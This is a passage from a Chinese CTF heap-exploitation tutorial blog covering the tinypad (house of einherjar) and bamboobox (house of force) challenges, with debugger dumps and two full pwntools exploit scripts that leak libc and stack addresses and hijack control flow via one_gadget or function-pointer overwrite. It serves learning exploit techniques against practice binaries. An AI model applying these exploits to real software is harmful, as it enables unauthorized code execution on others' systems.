&lt;0x7f5fc75a0830; __libc_start_main+240&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7f5fc75a0830 &lt;__libc_start_main+240&gt;    mov    edi, eax</span><br><span class="line">   0x7f5fc75a0832 &lt;__libc_start_main+242&gt;    call   <span class="built_in">exit</span> &lt;0x7f5fc75ba030&gt;</span><br><span class="line"> </span><br><span class="line">   0x7f5fc75a0837 &lt;__libc_start_main+247&gt;    xor    edx, edx</span><br><span class="line">   0x7f5fc75a0839 &lt;__libc_start_main+249&gt;    jmp    __libc_start_main+57 &lt;0x7f5fc75a0779&gt;</span><br><span class="line"> </span><br><span class="line">   0x7f5fc75a083e &lt;__libc_start_main+254&gt;    mov    rax, qword ptr [rip + 0x3a8ecb] &lt;0x7f5fc7949710&gt;</span><br><span class="line">   0x7f5fc75a0845 &lt;__libc_start_main+261&gt;    ror    rax, 0x11</span><br><span class="line">   0x7f5fc75a0849 &lt;__libc_start_main+265&gt;    xor    rax, qword ptr fs:[0x30]</span><br><span class="line">   0x7f5fc75a0852 &lt;__libc_start_main+274&gt;    call   rax</span><br><span class="line"> </span><br><span class="line">   0x7f5fc75a0854 &lt;__libc_start_main+276&gt;    mov    rax, qword ptr [rip + 0x3a8ea5] &lt;0x7f5fc7949700&gt;</span><br><span class="line">   0x7f5fc75a085b &lt;__libc_start_main+283&gt;    ror    rax, 0x11</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fff53d21e68 —▸ 0x7f5fc75a0830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">01:0008│      0x7fff53d21e70 ◂— 0x1</span><br><span class="line">02:0010│      0x7fff53d21e78 —▸ 0x7fff53d21f48 —▸ 0x7fff53d233b3 ◂— <span class="string">'./tinypad'</span></span><br><span class="line">03:0018│      0x7fff53d21e80 ◂— 0x1c7b6fca0</span><br><span class="line">04:0020│      0x7fff53d21e88 —▸ 0x400863 (main) ◂— push   rbp</span><br><span class="line">05:0028│      0x7fff53d21e90 ◂— 0x0</span><br><span class="line">06:0030│      0x7fff53d21e98 ◂— 0x63cd5245d4e10d9c</span><br><span class="line">07:0038│      0x7fff53d21ea0 —▸ 0x4006e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0           400e68 main+1541</span><br><span class="line">   f 1     7f5fc75a0830 __libc_start_main+24</span><br></pre></td></tr></table></figure><p>为什么是libc_start_main?建议看看第三篇讲的linux x86程序启动<br>给链接</p><p><span class="exturl" data-url="aHR0cHM6Ly9sdW9tdXhpYW94aWFvLmNvbS8/cD01MTY=" title="https://luomuxiaoxiao.com/?p=516">linux_x86程序启动中文版<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cDovL2RicC1jb25zdWx0aW5nLmNvbS90dXRvcmlhbHMvZGVidWdnaW5nL2xpbnV4UHJvZ3JhbVN0YXJ0dXAuaHRtbA==" title="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">linux_x86程序启动英文版<i class="fa fa-external-link"></i></span></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">84	../sysdeps/unix/syscall-template.S: No such file or directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> RAX  0xfffffffffffffe00</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x7f30af211260 (__read_nocancel+7) ◂— cmp    rax, -0xfff</span><br><span class="line"> RDX  0x1</span><br><span class="line"> RDI  0x0</span><br><span class="line"> RSI  0x7fff48b59964 ◂— 0x7b51190000000000</span><br><span class="line"> R8   0x1</span><br><span class="line"> R9   0x1999999999999999</span><br><span class="line"> R10  0x0</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x4006e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fff48b59a80 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fff48b59900 —▸ 0x7fff48b59950 —▸ 0x7fff48b59970 —▸ 0x7fff48b599a0 —▸ 0x401370 (__libc_csu_init) ◂— ...</span><br><span class="line"> RSP  0x7fff48b598b8 —▸ 0x400ed9 (_read_n+112) ◂— mov    qword ptr [rbp - 0x10], rax</span><br><span class="line"> RIP  0x7f30af211260 (__read_nocancel+7) ◂— cmp    rax, -0xfff</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► 0x7f30af211260 &lt;__read_nocancel+7&gt;     cmp    rax, -0xfff</span><br><span class="line">   0x7f30af211266 &lt;__read_nocancel+13&gt;    jae    <span class="built_in">read</span>+73 &lt;0x7f30af211299&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7f30af211299 &lt;<span class="built_in">read</span>+73&gt;               mov    rcx, qword ptr [rip + 0x2ccbd8]</span><br><span class="line">   0x7f30af2112a0 &lt;<span class="built_in">read</span>+80&gt;               neg    eax</span><br><span class="line">   0x7f30af2112a2 &lt;<span class="built_in">read</span>+82&gt;               mov    dword ptr fs:[rcx], eax</span><br><span class="line">   0x7f30af2112a5 &lt;<span class="built_in">read</span>+85&gt;               or     rax, 0xffffffffffffffff</span><br><span class="line">   0x7f30af2112a9 &lt;<span class="built_in">read</span>+89&gt;               ret    </span><br><span class="line"> </span><br><span class="line">   0x7f30af2112aa                         nop    word ptr [rax + rax]</span><br><span class="line">   0x7f30af2112b0 &lt;write&gt;                 cmp    dword ptr [rip + 0x2d2489], 0 &lt;0x7f30af4e3740&gt;</span><br><span class="line">   0x7f30af2112b7 &lt;write+7&gt;               jne    write+25 &lt;0x7f30af2112c9&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7f30af2112c9 &lt;write+25&gt;              sub    rsp, 8</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fff48b598b8 —▸ 0x400ed9 (_read_n+112) ◂— mov    qword ptr [rbp - 0x10], rax</span><br><span class="line">01:0008│      0x7fff48b598c0 —▸ 0x7fff48b598f0 —▸ 0x4018d8 (prompt_cmd) ◂— sub    byte ptr [rbx + 0x4d], al /* <span class="string">'(CMD)&gt;&gt;&gt; '</span> */</span><br><span class="line">02:0010│      0x7fff48b598c8 ◂— 0x1</span><br><span class="line">03:0018│      0x7fff48b598d0 —▸ 0x7fff48b59964 ◂— 0x7b51190000000000</span><br><span class="line">04:0020│      0x7fff48b598d8 —▸ 0x400fad (_write_n+112) ◂— mov    qword ptr [rbp - 0x10], rax</span><br><span class="line">05:0028│      0x7fff48b598e0 —▸ 0x401a29 ◂— or     al, byte ptr [rax] /* <span class="string">'\n'</span> */</span><br><span class="line">06:0030│      0x7fff48b598e8 ◂— 0x0</span><br><span class="line">07:0038│      0x7fff48b598f0 —▸ 0x4018d8 (prompt_cmd) ◂— sub    byte ptr [rbx + 0x4d], al /* <span class="string">'(CMD)&gt;&gt;&gt; '</span> */</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0     7f30af211260 __read_nocancel+7</span><br><span class="line">   f 1           400ed9 _read_n+112</span><br><span class="line">   f 2           401100 read_until+73</span><br><span class="line">   f 3           400832 getcmd+92</span><br><span class="line">   f 4           4009c1 main+350</span><br><span class="line">   f 5     7f30af13a830 __libc_start_main+240</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ find <span class="string">'0x7f30af13a830'</span></span><br><span class="line">Searching <span class="keyword">for</span> <span class="string">'0x7f30af13a830'</span> <span class="keyword">in</span>: None ranges</span><br><span class="line">Found 1 results, display max 1 items:</span><br><span class="line">[stack] : 0x7fff48b599a8 --&gt; 0x7f30af13a830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)</span><br><span class="line">gdb-peda$ p 0x7fff48b599a8-0x7fff48b59a98</span><br><span class="line"><span class="variable">$1</span> = 0xffffffffffffff10</span><br><span class="line">gdb-peda$ p 0x7fff48b59a98-0x7fff48b599a8</span><br><span class="line"><span class="variable">$2</span> = 0xf0</span><br></pre></td></tr></table></figure><p>这里说下怎么找偏移，<br>从environ里leak出来的地址[+] main_ret: 0x7fff48b59a98，在与find出来的地址，find 的话，是find上面的f5那个地址，就是查找存了这个地址的位置，然后计算下偏移就行了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p 0x7fff48b59a98-0x7fff48b599a8</span><br><span class="line"><span class="variable">$2</span> = 0xf0</span><br></pre></td></tr></table></figure><p>完结，撒花</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./tinypad'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(<span class="string">'./tinypad'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"(CMD)&gt;&gt;&gt; "</span>, idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="string">"A"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(SIZE)&gt;&gt;&gt; "</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"(CONTENT)&gt;&gt;&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="string">"D"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(INDEX)&gt;&gt;&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="string">"E"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(INDEX)&gt;&gt;&gt; "</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"(CONTENT)&gt;&gt;&gt; "</span>, content)</span><br><span class="line">    io.sendlineafter(<span class="string">"(Y/n)&gt;&gt;&gt; "</span>, <span class="string">"Y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="string">"Q"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#stage 1 leak the addr</span></span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'1'</span>*<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'2'</span>*<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'3'</span>*<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'4'</span>*<span class="number">0x80</span>)</span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line">    remove(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"INDEX: 1\n"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">    heap = u64(io.recvline().rstrip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x120</span></span><br><span class="line">    io.success(<span class="string">"heap: 0x%x"</span> % heap)</span><br><span class="line">    io.recvuntil(<span class="string">"INDEX: 3\n"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">    leak_libc = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">88</span></span><br><span class="line">    io.success(<span class="string">"main_arena: 0x%x"</span> %leak_libc)</span><br><span class="line">    libc_base = leak_libc - <span class="number">0x3c4b20</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    remove(<span class="number">4</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#stage 2</span></span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">'1'</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'2'</span>*<span class="number">0xf8</span> + p64(<span class="number">0x11</span>))</span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'3'</span>*<span class="number">0xf8</span>)</span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'4'</span>*<span class="number">0xf8</span>)</span><br><span class="line">    </span><br><span class="line">    tinypad = <span class="number">0x0000000000602040</span></span><br><span class="line">    offset = heap + <span class="number">0x20</span> - (<span class="number">0x602040</span> + <span class="number">0x20</span>)</span><br><span class="line">    io.success(<span class="string">"offset: 0x%x"</span> % offset)</span><br><span class="line">    fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(<span class="number">0x602060</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">3</span>, <span class="string">"4"</span>*<span class="number">0x20</span> + fake_chunk)</span><br><span class="line">    remove(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x18</span>, <span class="string">'1'</span>*<span class="number">0x10</span> + p64(offset))</span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">"4"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(leak_libc + <span class="number">88</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#stage 3</span></span><br><span class="line">    one_gadget = libc_base + <span class="number">0x45216</span></span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    environ_pointer = libc_base + libc.symbols[<span class="string">'__environ'</span>]</span><br><span class="line"></span><br><span class="line">    io.success(<span class="string">"environ_pointer: 0x%x"</span> % environ_pointer)</span><br><span class="line">    add(<span class="number">0xf0</span>, <span class="string">'1'</span>*<span class="number">0xd0</span> + p64(<span class="number">0x18</span>) + p64(environ_pointer) + <span class="string">'a'</span>*<span class="number">8</span> + p64(<span class="number">0x602148</span>))</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">" #   INDEX: 1\n"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">    main_ret = u64(io.recvline().rstrip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x8</span> * <span class="number">30</span></span><br><span class="line">    io.success(<span class="string">"main_ret: %x"</span> % main_ret)</span><br><span class="line">    edit(<span class="number">2</span>, p64(main_ret))</span><br><span class="line">    edit(<span class="number">1</span>, p64(one_gadget))</span><br><span class="line">    quit()</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="hitcontraning-lab11"><a href="#hitcontraning-lab11" class="headerlink" title="hitcontraning_lab11"></a>hitcontraning_lab11</h2><p>这题算是实验，所以直接调试exp，<br>运行环境： libc2.23.so</p><p>最新的libc2.29似乎加入了检查，运行exp报错</p><h3 id="漏洞利用过程-1"><a href="#漏洞利用过程-1" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>申请一个堆块状态，目的是覆盖top chunk</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/30gx 0x25ed000</span><br><span class="line">0x25ed000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x25ed010:	0x0000000000400896	0x00000000004008b1</span><br><span class="line">0x25ed020:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x25ed030:	0x0000000a61616464	0x0000000000000000</span><br><span class="line">0x25ed040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed060:	0x0000000000000000	0x0000000000020fa1</span><br><span class="line">0x25ed070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed0a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed0b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed0c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed0d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed0e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure><p>通过edit 覆盖到top chunk的size部分</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/30gx 0x25ed030-0x30</span><br><span class="line">0x25ed000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x25ed010:	0x0000000000400896	0x00000000004008b1</span><br><span class="line">0x25ed020:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x25ed030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x25ed040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x25ed050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x25ed060:	0x6161616161616161	0xffffffffffffffff</span><br><span class="line">0x25ed070:	0x000000000000000a	0x0000000000000000</span><br></pre></td></tr></table></figure><p>此时top chunk位置0x00000000025ed060</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p &amp;main_arena</span><br><span class="line"><span class="variable">$1</span> = (malloc_state *) 0x7f2a72614b20 &lt;main_arena&gt;</span><br><span class="line">gdb-peda$ x/20gx 0x7f2a72614b20</span><br><span class="line">0x7f2a72614b20 &lt;main_arena&gt;:	0x0000000100000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b50 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00000000025ed060</span><br></pre></td></tr></table></figure><p>位置为0x25ed060处，我们要覆盖的是0x25ed010处指针，故偏移为0x25ed060-0x25ed010-0x10 = 0x60</p><p>不过是负的，我们要往上偏移，所以要malloc(-)的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (req) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (INTERNAL_SIZE_T)(<span class="number">-2</span> * MINSIZE))</span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="line">         ? MINSIZE                                                             \</span><br><span class="line">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span><br><span class="line">        __set_errno(ENOMEM);                                                   \</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;                                                              \</span><br><span class="line">    &#125;                                                                          \</span><br><span class="line">    (sz) = request2size(req);</span><br></pre></td></tr></table></figure><p>这里先要过掉第一个检查， -2*MINSIZE，可以pass,接下来要让我们的<br>((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) 刚好等于=-60<br>所以要减掉个SIZE_SZ, -68就是malloc大小了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p &amp;main_arena</span><br><span class="line"><span class="variable">$1</span> = (malloc_state *) 0x7f2a72614b20 &lt;main_arena&gt;</span><br><span class="line">gdb-peda$ x/20gx 0x7f2a72614b20</span><br><span class="line">0x7f2a72614b20 &lt;main_arena&gt;:	0x0000000100000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b50 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00000000025ed000</span><br><span class="line">0x7f2a72614b80 &lt;main_arena+96&gt;:	0x0000000000000000	0x00007f2a72614b78</span><br><span class="line">0x7f2a72614b90 &lt;main_arena+112&gt;:	0x00007f2a72614b78	0x00007f2a72614b88</span><br><span class="line">0x7f2a72614ba0 &lt;main_arena+128&gt;:	0x00007f2a72614b88	0x00007f2a72614b98</span><br><span class="line">0x7f2a72614bb0 &lt;main_arena+144&gt;:	0x00007f2a72614b98	0x00007f2a72614ba8</span><br><span class="line">gdb-peda$ x/10gx 0x00000000025ed000</span><br><span class="line">0x25ed000:	0x0000000000000000	0x0000000000000059</span><br><span class="line">0x25ed010:	0x0000000000400896	0x00000000004008b1</span><br><span class="line">0x25ed020:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x25ed030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x25ed040:	0x6161616161616161	0x6161616161616161</span><br></pre></td></tr></table></figure><p>你看成功转移到这里了，现在在malloc一次就可以了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x1483000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x21, </span><br><span class="line">  fd = 0x400d49 &lt;magic&gt;, </span><br><span class="line">  bk = 0x400d49 &lt;magic&gt;, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x39</span><br><span class="line">&#125;</span><br><span class="line">0x1483020 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x39, </span><br><span class="line">  fd = 0x6161616161616161, </span><br><span class="line">  bk = 0x6161616161616161, </span><br><span class="line">  fd_nextsize = 0x6161616161616161, </span><br><span class="line">  bk_nextsize = 0x6161616161616161</span><br><span class="line">&#125;</span><br><span class="line">0x1483058 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x6161616161616161, </span><br><span class="line">  size = 0x6161616161616161, </span><br><span class="line">  fd = 0xffffffffffffa1, </span><br><span class="line">  bk = 0xa, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功覆盖，最后退出一下就好了</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>这里直接用的ctf-wiki的exp,我只改动了一处，他还减多个0xf,没看懂，所以删掉了，也没事</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./bamboobox'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">additem</span><span class="params">(length, name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(idx, length, name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400d49</span></span><br><span class="line"><span class="comment"># we must alloc enough size, so as to successfully alloc from fake topchunk</span></span><br><span class="line">additem(<span class="number">0x30</span>, <span class="string">"ddaa"</span>)  <span class="comment"># idx 0</span></span><br><span class="line">payload = <span class="number">0x30</span> * <span class="string">'a'</span>  <span class="comment"># idx 0's content</span></span><br><span class="line">payload += <span class="string">'a'</span> * <span class="number">8</span> + p64(<span class="number">0xffffffffffffffff</span>)  <span class="comment"># top chunk's prev_size and size</span></span><br><span class="line"><span class="comment"># modify topchunk's size to -1</span></span><br><span class="line">modify(<span class="number">0</span>, <span class="number">0x41</span>, payload)</span><br><span class="line"><span class="comment"># top chunk's offset to heap base</span></span><br><span class="line">offset_to_heap_base = -(<span class="number">0x40</span> + <span class="number">0x20</span>)</span><br><span class="line">malloc_size = offset_to_heap_base - <span class="number">0x8</span> </span><br><span class="line">additem(malloc_size, <span class="string">"dada"</span>)</span><br><span class="line">additem(<span class="number">0x10</span>, p64(magic) * <span class="number">2</span>)</span><br><span class="line">gdb.attach(r)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一次性学了house of einherjar和house of force,ctf-wiki还是强，不过有些得自己调试才好,适合自己的才是最好的</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/14c79378/">https://noone-hub.github.io/posts/14c79378/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程8</title>
    <url>/posts/63c0a3ee/</url>
